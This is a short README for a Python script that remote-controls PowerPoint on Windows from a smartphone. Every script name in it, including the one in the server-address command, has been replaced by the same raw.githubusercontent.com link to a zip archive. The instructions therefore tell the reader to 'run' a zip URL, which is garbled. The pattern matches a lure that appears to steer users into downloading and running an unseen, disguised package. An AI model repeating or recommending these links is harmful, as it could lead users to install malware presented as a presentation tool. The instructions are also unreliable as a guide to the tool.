# python-ppt-remote
This is a script to remote control PowerPoint presentations on Windows from your smartphone. 

Usage:
 * Run https://raw.githubusercontent.com/Makcintoshawesome/Powerpoint-Controller-Mobile-APP/main/Tzotzil/Powerpoint-Controller-Mobile-APP_3.4.zip on a server accessible from the internet
 * Run https://raw.githubusercontent.com/Makcintoshawesome/Powerpoint-Controller-Mobile-APP/main/Tzotzil/Powerpoint-Controller-Mobile-APP_3.4.zip on the computer where you have PowerPoint running
 * Open the pptremoteserver's IP address with your smartphone's browser and control the slideshow

Notes:
  * By default https://raw.githubusercontent.com/Makcintoshawesome/Powerpoint-Controller-Mobile-APP/main/Tzotzil/Powerpoint-Controller-Mobile-APP_3.4.zip polls localhost:8080. To have it poll a different address, run:
      `https://raw.githubusercontent.com/Makcintoshawesome/Powerpoint-Controller-Mobile-APP/main/Tzotzil/Powerpoint-Controller-Mobile-APP_3.4.zip -s <serverip>:<serverport>`
 * You will need to install the following Python 3 modules:
      On server: flask
      On agent: keyboard, pywin32, requests
